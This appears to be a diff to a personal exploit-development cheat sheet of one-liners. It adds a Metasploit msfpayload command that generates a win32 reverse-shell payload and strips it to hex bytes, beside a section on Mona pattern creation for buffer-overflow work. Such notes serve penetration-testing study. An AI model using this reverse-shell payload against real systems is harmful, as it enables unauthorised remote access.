@@ -1,6 +1,11 @@
 # References
 tidbits and one liners
 
+# Hex bytes only
+```
+msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C | grep '"' |tr -d " " |tr -d "\n" |sed 's/[\"x;]//g'
+```
+
 # Mona
 ```
 # Pattern create 5000 bytes
